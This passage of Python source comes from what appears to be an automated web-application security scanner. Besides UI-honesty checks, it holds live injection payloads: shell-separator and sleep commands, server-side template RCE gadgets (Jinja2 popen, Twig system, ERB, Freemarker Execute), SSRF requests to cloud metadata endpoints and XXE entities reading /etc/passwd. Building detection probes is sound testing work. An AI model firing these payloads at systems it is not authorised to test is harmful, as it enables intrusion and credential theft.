        checked = 0
        for src in _SCRIPT_SRC.findall(html):
            pu = urllib.parse.urlparse(urllib.parse.urljoin(ctx.base_url.rstrip("/") + "/", src.strip()))
            if pu.netloc and pu.netloc != host:
                continue   # a CDN/vendor script -> not the app's own bundle
            if _DEV_SCRIPT.search(pu.path):
                continue   # a dev-server / HMR / node_modules artifact (livereload, /@vite/, *.local.js) -> not
                #            the app's prod bundle; its 404 in a static deploy doesn't stop the app rendering
            try:
                r = c.get(pu.path)
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            final = urllib.parse.urlparse(str(r.url)).netloc
            if final and _registrable(final) != _registrable(host):
                continue   # the fetch redirected to a DIFFERENT registrable domain (a parked/moved site's HTML,
                #            basementhost -> tensordock) -> not a dead chunk of THIS app. An apex<->www canonical
                #            redirect stays SAME-site, so a real dead chunk on a www-canonical app still fires.
            checked += 1
            ct = r.headers.get("content-type", "").lower()
            # dead = an honest 404/410/5xx, OR a catch-all host serving the HTML shell where JS should be
            if r.status_code in (404, 410) or r.status_code >= 500 or ("html" in ct and "javascript" not in ct):
                ctx.evidence.update(dead_chunk=True, url=pu.path, status=r.status_code,
                                    served_ct=ct, repro=_repro_from_resp(r, matched="the app's own <script src> does not resolve to JS"))
                return True   # the served HTML points at a bundle the app can't load -> can't render
        if checked == 0:
            ctx.evidence["na_reason"] = "the served HTML references no same-origin script bundle"
            return None
        ctx.evidence.update(dead_chunk=False, scripts_checked=checked)
        return False


_DL_API_ROUTE = re.compile(r"^/(api|v\d+|rest|graphql|graphiql|oauth|rpc|trpc|webhook|\.well-known)(/|$)", re.I)
_DL_NONVIEW_EXT = (".js", ".mjs", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".webp", ".ico", ".json",
                   ".woff", ".woff2", ".ttf", ".map", ".mp4", ".webm", ".mp3", ".wav", ".mov", ".avi",
                   ".pdf", ".zip", ".xml", ".txt", ".csv")


def deep_link_shell(ctx, probe) -> bool | None:
    """Broken deep link on an SPA (UI-state honesty): a client-side route requested DIRECTLY — a shared/
    bookmarked link, fresh nav — renders only the app's shell/fallback, not its own content. ONLY on a
    catch-all host (REUSE _catch_all_sig, not a second detector): it serves a 200 shell for any path, so an
    HTTP-status check (broken-links) can't see this — the route 'works' at the HTTP layer but the client never
    paints it. Render a guaranteed-nonexistent route as the fallback baseline + each discovered route; fire
    when a real route renders ~identically to the fallback. N/A on an honest-404 host (broken-links covers
    those), without a browser, or with no non-root app route."""
    if _catch_all_sig(ctx) is None:
        ctx.evidence["na_reason"] = "not a catch-all/SPA host — a broken deep link is an honest 404 (broken-links covers it)"
        return None
    # a client-side VIEW route only — NOT an API endpoint or an asset. profile.routes conflates all three:
    # excluding discovered endpoints + /api-style prefixes + non-view extensions kills the FP where a bare
    # API path (/api/broadcast, /v1/accounts) or a media asset (.mp4) renders the shell and looks "broken".
    endpoint_paths = {(e.raw_path or e.path or "").split("?")[0].rstrip("/") for e in ctx.profile.endpoints}
    routes = [r for r in ctx.profile.routes
              if r not in ("/", "") and not r.startswith(("/_next/", "/static/", "/assets/"))
              and not _DL_API_ROUTE.search(r)                              # /api,/v1,/graphql,... = endpoint, not a view
              and "/api/" not in r.lower()                                 # a MID-PATH api call (/x/api/feedback) too
              and "index.htm" not in r.split("?")[0].lower()               # the entry alias, not a deep-link sub-view
              and r.split("?")[0].rstrip("/") not in endpoint_paths        # discovered as an API endpoint -> not a view
              and not r.split("?")[0].lower().endswith(_DL_NONVIEW_EXT)]    # a JS/media/doc asset, not a view
    if not routes:
        ctx.evidence["na_reason"] = "no non-root app route to deep-link test"
        return None
    verdict, route = browser.deep_link_broken(ctx.base_url, routes, headers=ctx.headers)
    if verdict == "broken":
        ctx.evidence.update(broken_deeplink=True, route=route)
        return True   # a direct load of a real route rendered only the shell/fallback -> the deep link is dead
    if verdict == "ok":
        ctx.evidence.update(broken_deeplink=False)
        return False
    ctx.evidence["na_reason"] = "couldn't render routes to compare (no browser / blank fallback / all routes blank)"
    return None


def no_error_state(ctx, probe) -> bool | None:
    """Silent failure / no error state (UI-state honesty — the opposite failure mode of qa-errhyg's overshare):
    a runner-initiated action (create/save form submit) whose request is FORCED to fail shows NO failure
    indication in the DOM — the app silently lost the user's data and told them nothing (or faked success).
    The forced failure makes the OUTCOME definitively failed, so a silent-retry-that-succeeds can't confuse it;
    ANY indication (message / red field / toast) counts as handled — we grade that an apology exists, not its
    quality. N/A without a browser or a create form whose submit fires a mutating request."""
    form = auth.create_form(ctx.profile.forms)
    if form is None:
        ctx.evidence["na_reason"] = "no create/save form to submit-and-fail"
        return None
    hdrs = dict(ctx.headers or {})   # authenticate the page if we hold a session (the form is usually gated)
    account = ctx.register(suffix="_noerr")
    if account is not None and not account.provided:
        cookie = "; ".join("%s=%s" % (c.name, c.value) for c in account.client.cookies.jar)
        if cookie:
            hdrs["Cookie"] = cookie
        authz = account.client.headers.get("Authorization")
        if authz:
            hdrs["Authorization"] = authz
    try:
        verdict = browser.silent_failure_on_action(ctx.base_url, headers=hdrs or None)
    finally:
        if account is not None:
            account.client.close()
    ctx.evidence.update(verdict=verdict, action=form.action)
    if verdict == "silent":
        ctx.evidence["matched"] = ("forced the submit of %s to fail; the app showed no error/failure "
                                   "indication (silent data loss)" % form.action)
        return True   # the action's request failed and the app showed the user nothing -> silent data loss
    if verdict == "handled":
        return False
    ctx.evidence["na_reason"] = "no create form submitted a mutating request to fail (client-only / no browser)"
    return None


# OS command injection — comprehensive coverage: shell separators (; | || && newline), command
# substitution ($(...) and backticks), and a blind time-based fallback; one finding. Precision: the
# marker is the RESULT of a shell-evaluated arithmetic expr (13*13 -> 169) — it appears ONLY if a shell
# ran the payload, never from reflecting the literal (which shows the "$((13*13))" text). Execution, not echo.
# The IN-BAND deterministic verifier: a shell HASHES a random salt exactly (`printf SALT | sha256sum`), a value
# only GENUINE execution produces. An LLM reliably cannot hash an arbitrary string (a digest is neither memorized
# nor reachable by generation, and the salt is fresh per run), reflection returns the payload not the digest, a
# hashing app hashes the whole payload (not the bare salt) so its digest never matches, and a random 64-hex salt
# rules out a coincidental hit -> no LLM / reflection / echo / hashing-app false positive. `printf` (not `echo -n`,
# which is unreliable across shells) emits the salt with NO trailing newline so the digest we compute locally
# matches; the salt is hex-only, carrying no % or \ for printf to reinterpret. The old arithmetic marker was
# WRONG: a strong LLM can multiply, so a computed value can never be an execution oracle (only a hash can).
_CMD_HASH = ("printf {s} | sha256sum", "printf {s} | md5sum")
_CMD_SEPS = (";%s", "|%s", "||%s", "&&%s", "\n%s", "$(%s)", "`%s`")
_CMD_TIME = (";sleep {d}", "$(sleep {d})", "`sleep {d}`", "&&sleep {d}", "|sleep {d}")

# The injection fan-out probes follow redirects (to see a PRG result page carrying the oracle), but httpx fires
# the response hook PER HOP, so a redirect-heavy origin multiplies BOTH the wire traffic and the request tally
# (the 1626-request cmdi / 504-request ssti outliers -- both far above their payload budgets -- are hop-
# inflated, not extra payloads). A genuine injection result is <=1-2 hops away (POST->302->GET), so cap the
# chain: bounds the amplification and fails fast on a redirect loop (which is dinged elsewhere anyway). Cut 4->2:
# the legit case is one POST-redirect-GET; more just let a /login chain balloon the request tally.
_INJECT_MAX_REDIRECTS = 2
# INJECTION TOTAL-request cap (shared by cmdi/ssti/lfi). The payload budgets count logical ATTEMPTS, but the
# per-target baseline/liveness fan-out + redirect HOPS (each one a request the WAF sees, tallied by
# net.request_counts) let a redirecting app reach ~900 requests (v21 ssti hit 991). Bound the ACTUAL request
# count so no app exceeds this. cmdi had this cap; ssti/lfi never got it despite the same hop inflation (their
# budgets are attempts, not requests) -- hence the runaway tail. It's near-lossless: a real injection is found in
# the first handful of attempts, and the score collapses all instances to ONE finding, so the deep tail only
# buys marginal confidence in a CLEAN verdict, which saturates well below this cap.
_INJECT_MAX_REQUESTS = 150
_CMDI_MAX_REQUESTS = _INJECT_MAX_REQUESTS   # kept for the cmdi reference below; same value

# Per-app HTTP concurrency for the DETERMINISTIC injection payloads. Injection is I/O-bound (waiting on the
# remote origin), so firing N at once is ~free on CPU and doesn't compete for the grade box's cores -- it just
# fills the network wait. N IS the per-origin burst rate, so keep it modest: a per-origin rate-limit it trips is
# salvaged by retry_blocked's low-traffic subset re-grade. Score-safe: same payloads + same oracle, only the
# ORDER/TIMING changes, so the deterministic verdict is identical. TIME-BASED oracles (dose-response sleep, blind
# SQLi timing) must NEVER use this -- concurrent requests confound the latency they measure. Env-tunable so the
# burst can be dialed on a flaky corpus without a code change.
_INJECT_POOL = max(1, int(os.environ.get("SLOPTIC_INJECT_POOL", "6")))
# Separate, LOWER default for the sensitive-file path scan: the enumeration probes are where the per-origin WAF
# challenge onsets first (measured: sec-exposure-007 is the #1 challenge trigger), because they spray many paths
# at one origin. A smaller pool keeps that burst gentler; retry_blocked still salvages anything it trips.
_EXPOSURE_POOL = max(1, int(os.environ.get("SLOPTIC_EXPOSURE_POOL", "4")))


def _fan_out_first(send, specs, oracle, pool=_INJECT_POOL, cap_check=None):
    """Fire `specs` through a bounded thread pool and return the FIRST (spec, resp) whose oracle(spec, resp) is
    truthy, then STOP submitting (short-circuit -- an injection probe wants one confirmed hit, not all of them).
    `send(spec) -> (spec, resp_or_None)`; a spec that errors should return (spec, None). `cap_check() is True`
    stops further submission (the request budget). Returns None if nothing hit. A single httpx.Client is
    thread-safe for concurrent requests, so callers share one client across the pool.

    DETERMINISTIC oracles ONLY. A latency/time oracle is invalid here -- concurrent requests contend and inflate
    each other's measured response time into false positives; those probes keep their sequential path."""
    it = iter(specs)
    hit = None
    with ThreadPoolExecutor(max_workers=max(1, pool)) as ex:
        pending = set()

        def _refill():
            while len(pending) < max(1, pool):
                if cap_check is not None and cap_check():
                    return
                nxt = next(it, None)
                if nxt is None:
                    return
                pending.add(ex.submit(send, nxt))
        _refill()
        while pending and hit is None:
            done, keep = wait(pending, return_when=FIRST_COMPLETED)
            pending = keep
            for fut in done:
                try:
                    spec, resp = fut.result()
                except Exception:              # a worker that raised past its own guards -> treat as a miss
                    spec, resp = None, None
                if resp is not None and oracle(spec, resp):
                    hit = (spec, resp)
                    break
            if hit is None:
                _refill()
        for fut in pending:                    # short-circuit: cancel whatever hasn't started (running ones drain)
            fut.cancel()
    return hit


def _request_capped(probe, default: int = _INJECT_MAX_REQUESTS):
    """Return a no-arg predicate that's True once THIS probe has sent `max_requests` ACTUAL requests (every
    redirect hop counted, via net.request_counts) -- the hard stop against a redirecting app amplifying
    attempts x hops into a WAF-tripping, timeout-blowing burst. A unit-test mock probe with no .id is never
    capped (no request_counts entry)."""
    pid = getattr(probe, "id", "")
    max_req = probe.probe.get("max_requests", default)

    def capped() -> bool:
        rc = request_counts()
        return rc is not None and rc.get(pid, 0) >= max_req
    return capped


# An auth route a target gets 302'd to when it's behind a session we don't hold. Injecting such a target
# unauthenticated just bounces off the login page: every attempt is WASTED (no sink reached) and redirect-
# amplified. So skip it -- the fix that STOPS the waste, vs the cap which only bounds it. (Authenticated
# injection, which actually reaches the surface, is the register lane's job -- the point of email verification.)
_AUTH_REDIRECT = re.compile(r"/(?:log-?in|sign-?in|sign-?up|register|auth(?:enticate)?|account|session|oauth)"
                            r"(?:[/?#]|$)", re.I)


def _redirects_to_auth(resp) -> bool:
    """True when a target is 302'd to an auth route -- login-gated, not testable without a session, so injection
    just fuzzes the /login redirect. Handles BOTH a direct 3xx (follow_redirects=False -> the Location is the auth
    route) AND a followed chain (follow_redirects=True -> the final URL / any hop's Location is an auth route)."""
    try:
        if resp.is_redirect and _AUTH_REDIRECT.search(resp.headers.get("location", "")):
            return True
        if resp.history:
            if _AUTH_REDIRECT.search(str(getattr(resp.url, "path", "") or "")):
                return True
            return any(_AUTH_REDIRECT.search(h.headers.get("location", "")) for h in resp.history)
    except Exception:
        pass
    return False


def _authed_headers(ctx):
    """The session headers the injection probes should inject WITH, so they reach the AUTHED surface instead of
    bouncing off /login (the whole point of the register lane / email verification -- injecting anonymously is
    blind to everything behind login). A caller-supplied --header session wins; otherwise the register-lane
    session (self-registered / email-verified, memoized on ctx). Falls back to ctx.headers (anonymous) when no
    session can be established -- and _redirects_to_auth then skips the login-gated targets. Merged onto
    ctx.headers so a UA / provided header survives. Memoized on ctx (one registration shared across the injection
    probes, not one each)."""
    if auth._provided_session(getattr(ctx, "headers", None)):
        return ctx.headers                                   # the caller's session is already carried
    cache = getattr(ctx, "_email_cache", None)
    if isinstance(cache, dict) and "_authed_headers" in cache:
        return cache["_authed_headers"]
    result = getattr(ctx, "headers", None)                   # anonymous fallback (the auth-redirect skip handles /login)
    reg = getattr(ctx, "register", None)
    if callable(reg):
        try:
            acct = reg()                                     # establish the register-lane session (once)
        except Exception:
            acct = None
        if acct is not None:
            try:
                session = _snapshot_session(acct).get("headers") or {}   # Cookie / Bearer / apikey, replayable
            finally:
                with contextlib.suppress(Exception):
                    acct.client.close()
            if session:
                result = {**(ctx.headers or {}), **session}
    if isinstance(cache, dict):
        cache["_authed_headers"] = result
    return result


def _elapsed(c, method, action, data) -> float:
    """Seconds for one request; a large sentinel on error so it can't look like a fast baseline."""
    t0 = time.perf_counter()
    try:
        _xss_send(c, method, action, data)
    except (httpx.HTTPError, httpx.InvalidURL):
        return 0.0
    return time.perf_counter() - t0


def _cmd_time_scales(c, method, action, fields, field, delay) -> bool:
    """Blind command injection via a DOSE-RESPONSE sleep: the 3x dose must add >= ~1.4*delay of latency on
    BOTH trials, so a slow host or proxy with a fixed latency (that ignores the sleep argument) cannot fire it.
    Mirrors the SQLi `_tech_time` invariant: a naturally-slow endpoint does not track the dose, a real sleep does."""
    def elapsed(cmd):
        data = {fn: (cmd if fn == field else _XSS_FILLER) for fn in fields}
        t0 = time.perf_counter()
        try:
            _xss_send(c, method, action, data)
        except (httpx.HTTPError, httpx.InvalidURL):
            return None
        return time.perf_counter() - t0
    for tmpl in _CMD_TIME:
        ok = True
        for _ in range(2):
            hi, lo = elapsed(tmpl.format(d=delay * 3)), elapsed(tmpl.format(d=delay))
            if hi is None or lo is None or hi - lo < delay * 1.4:
                ok = False
                break
        if ok:
            return True
    return False


def command_injection(ctx, probe) -> bool | None:
    """OS command injection across forms + query params + JSON API bodies. IN-BAND HASH oracle: inject
    `<sep> printf <salt> | sha256sum` and look for the salt's exact digest; a shell hashes it, but nothing
    else can (an LLM cannot hash an arbitrary string, reflection returns the payload, a hashing app hashes the
    wrong bytes), so the digest only appears from GENUINE execution. A computed value (the old arithmetic
    marker) can never be this oracle: a capable LLM just multiplies. BLIND fallback: a DOSE-RESPONSE sleep
    whose delay must SCALE with the injected duration (a slow host/proxy's latency ignores the argument).
    Gated on endpoint liveness so a catch-all / soft-404 shell cannot invent a finding. N/A when no input."""
    targets = _injectable_targets(ctx.profile) + _json_body_targets(ctx.profile)
    if not targets:
        return None
    targets = targets[: probe.probe.get("max_targets", 40)]   # cap the per-target baseline/liveness fan-out
    budget = probe.probe.get("max_attempts", 100)             # payload cap (100 seps x 2 hashes); modest trim
    max_req = probe.probe.get("max_requests", _CMDI_MAX_REQUESTS)   # hard cap on ACTUAL WAF-visible requests (hops incl.)
    delay = probe.probe.get("time_delay", 3)
    salt = "hlci" + secrets.token_hex(6)
    wanted = (hashlib.sha256(salt.encode()).hexdigest(), hashlib.md5(salt.encode()).hexdigest())
    tested = False
    checked = 0
    deep: list = []

    _pid = getattr(probe, "id", "")   # a unit-test mock probe may lack .id -> no request_counts entry -> uncapped
    def _capped():   # ACTUAL requests this probe has already sent (net.request_counts tallies every hop)
        rc = request_counts()
        return rc is not None and rc.get(_pid, 0) >= max_req
    with make_client(ctx.base_url, _authed_headers(ctx), timeout=max(15.0, delay * 3 + 8),
                     follow_redirects=True, max_redirects=_INJECT_MAX_REDIRECTS) as c:
        for action, method, fields in targets:
            if budget <= 0 or _capped():
                break
            filler = {fn: _XSS_FILLER for fn in fields}
            try:
                base = _xss_send(c, method, action, filler)
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if _redirects_to_auth(base):
                continue  # login-gated target -> not testable without a session; skip (don't fuzz the redirect)
            if any(w in base.text for w in wanted):
                continue  # digest already present (impossible for a random salt, but cheap) -> unattributable
            if _UPSTREAM_ERROR.search(base.text):
                continue  # proxies a third-party API -> latency/output track the upstream, not a shell
            if not _endpoint_is_live(ctx, c, action, method, base):
                continue  # catch-all / soft-404 shell -> phantom endpoint, not a real command sink
            # DETERMINISTIC in-band hash oracle across (field x separator): the requests are independent and the
            # oracle is a fixed digest, so fire them CONCURRENTLY (I/O-bound, ~free on CPU) and stop on the first
            # shell that hashes the salt. Each (field, sep) spec = 1 attempt = the 2 hash-template hops. The
            # time-based dose-response stays sequential (deep), below -- concurrency would confound its latency.
            if budget > 0 and not _capped():
                pairs = [(fld, sep) for fld in fields for sep in _CMD_SEPS][:budget]  # respect the attempt budget
                budget -= len(pairs)
                checked += len(fields)
                tested = True

                def _cmd_send(spec):
                    fld, sep = spec
                    for htmpl in _CMD_HASH:
                        data = {fn: (sep % htmpl.format(s=salt) if fn == fld else _XSS_FILLER) for fn in fields}
                        try:
                            resp = _xss_send(c, method, action, data)
                        except (httpx.HTTPError, httpx.InvalidURL):
                            continue
                        if any(w in resp.text for w in wanted):
                            return spec, resp        # a shell hashed the salt to its exact digest -> real injection
                    return spec, None
                got = _fan_out_first(_cmd_send, pairs, lambda s, r: r is not None, cap_check=_capped)
                if got is not None:
                    ctx.evidence.update(injectable=True, execution_confirmed=True, via="in-band hash",
                                        target=action, field=got[0][0])
                    return True
            for fld in fields:
                if len(deep) < _DEEP_SLOTS and method != "postjson":
                    # blind time-based stays OFF JSON API sinks (a slow JSON endpoint's latency variance ~= the
                    # FP failure mode); the deterministic hard-product oracle still runs on them and IS specific.
                    deep.append((action, method, fields, fld))
        for action, method, fields, field in deep:  # blind: DOSE-RESPONSE sleep (delay must scale with the dose)
            if _capped():
                break
            if _cmd_time_scales(c, method, action, fields, field, delay):
                data = {fn: (_CMD_TIME[0].format(d=delay) if fn == field else _XSS_FILLER) for fn in fields}
                ctx.evidence.update(injectable=True, via="time-based", target=action, field=field,
                                    repro=_form_repro(ctx, method, action, data,
                                                      matched="response delay scaled with the injected sleep (blind command injection)"))
                return True
    ctx.evidence.update(injectable=False, fields_tested=checked,
                        techniques=["separator", "substitution", "dose-response-time"])
    return False if tested else None


# Server-Side Template Injection + eval-based code injection — user input evaluated as CODE (a template
# expression or an eval'd statement) instead of treated as data -> RCE. Comprehensive across template
# engines AND eval sinks; one finding. Precision by a HASH oracle (as in command injection): the salt's digest
# appears only if the input was EXECUTED; reflecting the literal shows the payload, never the digest. A hash,
# not the old arithmetic marker, is the only sound execution oracle against an LLM target: a computed value can
# be produced by a capable model, but no model can hash an arbitrary salt.
# Hash-oracle SSTI: each payload makes the engine HASH the salt via eval or an RCE gadget whose OUTPUT reflects
# in-band (PHP/Python eval, Jinja2 popen, Twig map+system, ERB backtick, Freemarker Execute), a digest only
# GENUINE server-side execution yields. An LLM cannot hash the salt, reflection returns the payload, and a
# hashing app hashes the wrong bytes -> no LLM / reflection / echo FP. `{S}` is the salt placeholder (replaced,
# not %-formatted, so the engine braces survive). BARE-ARITHMETIC template eval (no eval / RCE / hash reachable)
# is deliberately NOT probed: a computed value is LLM-fakeable and therefore cannot be an execution oracle.
# (engine, template): the gadget is engine-specific, so the payload that yields the digest also NAMES the
# engine that executed it — an execution-PROVEN fingerprint, recorded as evidence (no extra round-trip, and
# more granular than a bare {{7*'7'}} arithmetic probe). The hash still does the firing; the engine only labels.
_SSTI_HASH_TMPL = (
    ("php-eval",    "<?php echo hash('sha256','{S}');?>"),                                          # PHP eval
    ("php-eval",    "<?php echo md5('{S}');?>"),                                                    # PHP eval
    ("python-eval", ";print(__import__('hashlib').sha256(b'{S}').hexdigest())#"),                   # Python eval
    ("jinja2",      "{{cycler.__init__.__globals__.os.popen('printf {S}|sha256sum').read()}}"),     # Jinja2 (Python)
    ("twig",        "{{['printf {S}|sha256sum']|map('system')|join('')}}"),                         # Twig (PHP)
    ("erb",         "<%= `printf {S}|sha256sum` %>"),                                               # ERB (Ruby)
    ("freemarker",  '<#assign x="freemarker.template.utility.Execute"?new()>${x("printf {S}|sha256sum")}'),  # Java
)


def ssti_injectable(ctx, probe) -> bool | None:
    """Template / eval code injection across query params and forms. Injects a HASH oracle in each template /
    eval shape (PHP/Python eval, Jinja2/Twig/ERB/Freemarker RCE gadget); fires when the salt's exact digest
    reflects — a value only genuine server-side execution produces, which an LLM cannot fake (unlike the old
    arithmetic marker, which a capable model just computes). N/A when no input surface. Query params are tested
    before forms (template/render sinks are usually GET params). On a fire, evidence records `engine` — the
    gadget that produced the digest names the engine that executed it (jinja2/twig/erb/freemarker/php/python-eval),
    an execution-proven fingerprint (the v2.0 LLM-echo foundation, item 4)."""
    q = [(e.raw_path, "get", list(e.query_params)) for e in ctx.profile.endpoints
         if e.method.lower() == "get" and e.query_params]
    forms = [(f.action, (f.method or "get").lower(), list(f.fields)) for f in ctx.profile.forms if f.fields]
    s = [(e.raw_path, "get", list(_COMMON_PARAMS)) for e in ctx.profile.endpoints
         if e.method.lower() == "get" and not e.query_params and not e.path_params
         and _SEARCHABLE.search(e.raw_path)]
    targets = q + forms + s + _json_body_targets(ctx.profile)   # + JSON API bodies (SPA sink)
    if not targets:
        return None
    targets = targets[: probe.probe.get("max_targets", 40)]   # cap the per-target fan-out
    salt = "hlssti" + secrets.token_hex(6)
    wanted = (hashlib.sha256(salt.encode()).hexdigest(), hashlib.md5(salt.encode()).hexdigest())
    payloads = [(engine, t.replace("{S}", salt)) for engine, t in _SSTI_HASH_TMPL]
    budget = probe.probe.get("max_attempts", 160)
    capped = _request_capped(probe)   # hard ACTUAL-request ceiling (hops incl.) -> no redirect-amplified runaway
    tested = False
    fields_seen = set()
    with make_client(ctx.base_url, _authed_headers(ctx), timeout=10.0,
                     follow_redirects=True, max_redirects=_INJECT_MAX_REDIRECTS) as c:
        for action, method, fields in targets:
            if capped():
                break
            try:   # one cheap baseline: a login-gated target just fuzzes the /login redirect -> skip it
                if _redirects_to_auth(_xss_send(c, method, action, {fn: _XSS_FILLER for fn in fields})):
                    continue
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if budget <= 0:
                break
            # DETERMINISTIC hash oracle across (field x engine-gadget): independent requests, so fan them out
            # concurrently and stop on the first engine that hashes the salt. The winning spec carries the engine
            # that executed it (the execution-proven fingerprint), so attribution is unchanged.
            specs = [(fld, engine, p) for fld in fields for engine, p in payloads][:budget]
            budget -= len(specs)
            if specs:
                tested = True
                for fld in fields:
                    fields_seen.add((action, fld))

                def _ssti_send(spec):
                    fld, _engine, p = spec
                    data = {fn: (p if fn == fld else _XSS_FILLER) for fn in fields}
                    try:
                        resp = _xss_send(c, method, action, data)
                    except (httpx.HTTPError, httpx.InvalidURL):
                        return spec, None
                    return (spec, resp) if any(w in resp.text for w in wanted) else (spec, None)
                got = _fan_out_first(_ssti_send, specs, lambda s, r: r is not None, cap_check=capped)
                if got is not None:
                    fld, engine, _p = got[0]
                    ctx.evidence.update(injectable=True, execution_confirmed=True, via="hash oracle",
                                        engine=engine, target=action, field=fld)
                    return True  # the engine hashed the salt to its exact digest -> real injection
            if capped():
                break
    ctx.evidence.update(injectable=False, fields_tested=len(fields_seen), expr_shapes=len(_SSTI_HASH_TMPL))
    return False if tested else None


# SSRF + XXE — both detected OUT-OF-BAND via a collaborator listener: inject a unique URL/entity that
# points back at the runner; a callback proves the target's SERVER made the request. Near-zero false
# positives (a random one-time URL is only fetched if the server actually requested it).
def _await_callback(collab, tokens, probe, timeout=2.5):
    deadline = time.perf_counter() + probe.probe.get("oob_wait", timeout)
    while time.perf_counter() < deadline:
        if any(collab.received(t) for t in tokens):
            return
        time.sleep(0.2)


_SSRF_PARAMS = ("url", "uri", "link", "src", "href", "callback", "webhook", "target", "host", "domain",
                "site", "feed", "proxy", "fetch", "load", "image", "img", "resource", "dest", "to",
                "out", "open", "page", "path", "data", "ref", "u", "server", "remote")

# IN-BAND fallback for the case OAST structurally cannot see: the server fetches the URL but its response
# comes back to US instead of reaching our collaborator. That is not a benchmark quirk — it is any function
# whose egress is filtered to the platform's own network, which is the normal state on the serverless hosts
# our corpus deploys to. Measured: sec-ssrf-001 was 0-for-2 on GapBench's two SSRF scenarios (`ssrf-image-
# proxy`, `gcp-metadata-ssrf`) because no callback could ever arrive, so the class was effectively dark.
#
# PRECISION RULE: every signature below is content the METADATA SERVICE returns and that never appears in
# the URL we send, so an app merely echoing our payload back cannot match. `computeMetadata` would have been
# the obvious GCP token to look for and is exactly wrong — it is in the request path.
_SSRF_INBAND = (
    ("http://169.254.169.254/computeMetadata/v1/?recursive=true",
     re.compile(r'"numericProjectId"|"serviceAccounts"\s*:', re.I)),
    # the identity document, not /iam/security-credentials/ — that one answers with a role NAME we cannot
    # guess, while this answers with a fixed JSON shape we can recognise without a second round trip.
    ("http://169.254.169.254/latest/dynamic/instance-identity/document",
     re.compile(r'"accountId"|"imageId"\s*:|"SecretAccessKey"', re.I)),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     re.compile(r'"vmId"|"subscriptionId"\s*:', re.I)),
)


def ssrf(ctx, probe) -> bool | None:
    """Server-Side Request Forgery: inject a unique collaborator URL into URL-ish params (url/uri/link/
    image/...); a callback to the listener proves the server fetched it. N/A when no URL-ish param."""
    targets = []
    for f in ctx.profile.forms:
        fields = [x for x in f.fields if x.lower() in _SSRF_PARAMS]
        if fields:
            targets.append((f.action, (f.method or "get").lower(), fields, list(f.fields)))
    for e in ctx.profile.endpoints:
        if e.method.lower() == "get":
            fields = [x for x in e.query_params if x.lower() in _SSRF_PARAMS]
            if fields:
                targets.append((e.raw_path, "get", fields, list(e.query_params)))
    if not targets:
        return None
    hosts = oob.callback_hosts()
    collab = oob.Collaborator()
    tokens: list[str] = []
    try:
        with make_client(ctx.base_url, ctx.headers, timeout=8.0, follow_redirects=True) as c:
            for action, method, url_fields, all_fields in targets:
                for field in url_fields:
                    for host in hosts:
                        token = "hlssrf" + secrets.token_hex(5)
                        tokens.append(token)
                        data = {fn: (collab.url(host, token) if fn == field else _XSS_FILLER) for fn in all_fields}
                        try:
                            _xss_send(c, method, action, data)
                        except (httpx.HTTPError, httpx.InvalidURL):
                            continue
        _await_callback(collab, tokens, probe)
        fired = any(collab.received(t) for t in tokens)
        url_params = sorted({f for _, _, uf, _ in targets for f in uf})
        if fired:
            ctx.evidence.update(callback_received=True, via="oast", internal_reached=True, url_params=url_params,
                                probes_sent=len(tokens))
            return True
        inband = _ssrf_inband(ctx, targets)
        if inband is not None:
            ctx.evidence.update(callback_received=False, via="in-band", internal_reached=True, url_params=url_params, **inband)
            return True
        ctx.evidence.update(callback_received=False, url_params=url_params, probes_sent=len(tokens))
        return False
    finally:
        collab.close()


def _ssrf_inband(ctx, targets) -> dict | None:
    """Ask the server to fetch a cloud metadata endpoint and look for the metadata service's OWN response
    in the body. Returns evidence when a signature matches, else None. The signature is never a substring
    of the URL we sent, so reflection cannot produce a hit."""
    with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True) as c:
        for action, method, url_fields, all_fields in targets:
            for field in url_fields:
                for url, sig in _SSRF_INBAND:
                    data = {fn: (url if fn == field else _XSS_FILLER) for fn in all_fields}
                    try:
                        r = _xss_send(c, method, action, data)
                    except (httpx.HTTPError, httpx.InvalidURL):
                        continue
                    m = sig.search(r.text or "")
                    if m:
                        return {"target": action, "field": field, "fetched": url,
                                "repro": _repro_from_resp(
                                    r, matched="cloud metadata response in body: " + m.group(0))}
    return None


_XXE_PAYLOAD = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "%s">]><r>&xxe;</r>'
# IN-BAND payloads: a file-read entity whose resolved content, reflected in the response, matches the LFI file
# signature. Works on egress-blocked / serverless hosts where an OOB callback can never leave the box.
_XXE_INBAND = (
    b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
    b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><r>&x;</r>',
)


def xxe(ctx, probe) -> bool | None:
    """XML External Entity. IN-BAND: POST an entity that reads a local file (/etc/passwd, win.ini); if the
    response REFLECTS the file's content it proves resolution, and it works on egress-blocked / serverless hosts
    where no OOB callback can leave the box. OOB: an entity pointing at the collaborator; a one-time callback
    proves it. Fires on either; the file content / random callback is proof no app can fabricate. N/A when no
    POST endpoint."""
    posts = list(dict.fromkeys(
        [f.action for f in ctx.profile.forms if (f.method or "").lower() == "post"]
        + [e.path for e in ctx.profile.endpoints if e.method.lower() == "post"]))
    if not posts:
        return None
    # IN-BAND first: a resolved file-read entity reflects the file's content straight back (egress-independent).
    with make_client(ctx.base_url, ctx.headers, timeout=8.0, follow_redirects=True) as c:
        for action in posts:
            for xml in _XXE_INBAND:
                for ctype in ("application/xml", "text/xml"):
                    try:
                        r = c.post(action, content=xml, headers={"Content-Type": ctype})
                    except (httpx.HTTPError, httpx.InvalidURL):
                        continue
                    if _LFI_SIG.search(r.text):
                        ctx.evidence.update(via="in-band file read", sensitive_fields=True, target=action)   # read a system file
                        return True  # the parser resolved file:///etc/passwd and reflected it -> XXE
    # OOB: a callback to our one-time URL proves the server fetched it (definitive, but dark on egress-blocked hosts).
    hosts = oob.callback_hosts()
    collab = oob.Collaborator()
    tokens: list[str] = []
    try:
        with make_client(ctx.base_url, ctx.headers, timeout=8.0, follow_redirects=True) as c:
            for action in posts:
                for host in hosts:
                    token = "hlxxe" + secrets.token_hex(5)
                    tokens.append(token)
                    xml = (_XXE_PAYLOAD % collab.url(host, token)).encode()
                    for ctype in ("application/xml", "text/xml"):
